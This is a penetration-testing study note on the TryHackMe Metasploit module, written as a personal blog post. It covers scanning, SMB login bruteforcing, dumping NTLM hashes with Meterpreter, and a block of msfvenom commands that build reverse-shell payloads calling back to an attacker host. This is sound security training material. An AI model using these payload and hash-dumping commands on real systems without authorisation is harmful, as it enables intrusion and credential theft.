# TryHackMe: Jr. Penetration Tester

## Exploitation with Metasploit

### Scanning

Use `search portscan` to display built-in Metasploit port scanners. Note that `msfconsole` needs to be run as root for many scans to work — just like Nmap. That said, in my experience the fancier TCP scans (for example, SYN) don’t work over a VPN… So maybe best to stick with Nmap.

Speaking of which, Nmap can also be called internally (like other shell commands).

The `auxiliary/scanner/discovery/udp_sweep` module will probe for common UDP services.

Metasploit has a variety of Samba/CIFS scanners too; use `search scanner/smb` to list them.

NetBIOS = Network Basic Input/Output System

TryHackMe emphasizes the importance of examining the usage of NetBIOS for potential vulnerabilities, though it’s a bit light on specifics about what this means in practice.

Use `show advanced` to show additional module options.

The `auxiliary/scanner/http/http_version` module will give you HTTP server version information.

The `auxiliary/scanner/smb/smb_login` module will allow you to bruteforce Samba logins (username and/or password) using a wordlist(s).

* [Using “nmap”](../notes/nmap.md)
* [SAMBA (a.k.a. CIFS) Protocol](../notes/samba.md)
* [TCP SYN Port Scanner - Metasploit](https://www.infosecmatter.com/metasploit-module-library/?mm=auxiliary/scanner/portscan/syn)

### The Metasploit Database

Get basic database status using `db_status`.

Create and delete workspaces (engagements) with `workspace`; use `-a` to add and `-d` to delete. Switch between workspaces using `workspace $NAME`.

Use `db_nmap` to run Nmap (all of the regular options work) and dump the results into the Metasploit database.

The `hosts` and `services` commands can then be used to display the, well, hosts and services logged by Metasploit during an engagement. Both commands support an `-S` search parameter, the results of which can then be added to `RHOSTS` using the `-R` parameter.

### Exploitation

Show the payloads available for a particular exploit using `show payloads`. Use `set payload` to set the payload for the exploit; re-run `show options` after this to check if the payload has added any additional options that will need to be set before exploitation.

Use `sessions` to, well, manage your sessions (most useful when you’ve backgrounded a payload and/or are working with multiple targets).

To dump NTLM hashes from Meterpreter, use the `hashdump` command. Normally only the first four fields are relevant:

* Username
* RID (the last four digits of the Windows SID, with leading zeros dropped)
* The user’s LM password hash
* The user’s NTLM password hash

References:

* [Dumping Windows Password Hashes Using Metasploit](https://www.utc.edu/sites/default/files/2021-04/4660-lab6.pdf)
* [Windows Password Hashes](../notes/windows-password-hashes.md)

### Msfvenom

Msfvenom is a tool to create custom versions of Metasploit payloads, encoded into a variety of different binary formats and scripts.

Use `--list formats` to see available encoding formats.

```bash
# 32-bit Linux ELF Meterpreter payload
#
msfvenom -p linux/x86/meterpreter/reverse_tcp \
LHOST=$ATTACKER_IP LPORT=$ATTACKER_PORT -f elf > rev_shell

# 32-bit Windows executable Meterpreter payload
#
msfvenom -p windows/meterpreter/reverse_tcp \
LHOST=$ATTACKER_IP LPORT=$ATTACKER_PORT -f exe > rev_shell.exe

# PHP Meterpreter payload
#
msfvenom -p php/meterpreter_reverse_tcp \
LHOST=$ATTACKER_IP LPORT=$ATTACKER_PORT -f raw > rev_shell.php

# ASP Meterpreter payload
#
msfvenom -p windows/meterpreter/reverse_tcp \
LHOST=$ATTACKER_IP LPORT=$ATTACKER_PORT -f asp > rev_shell.asp

# Python Meterpreter payload
#
msfvenom -p cmd/unix/reverse_python \
LHOST=$ATTACKER_IP LPORT=$ATTACKER_PORT -f raw > rev_shell.py
```

Use the `exploit/multi/handler` module in Metasploit to catch the shells produced using Msfvenom (note that you’ll need to use `set payload` to tell Metasploit *what* it’s catching!). We can catch both regular reverse shells and Meterpreter sessions this way.

- - - -

<span aria-hidden="true">👤</span> Nathan Acks  
<span aria-hidden="true">📅</span> April 14, 2022
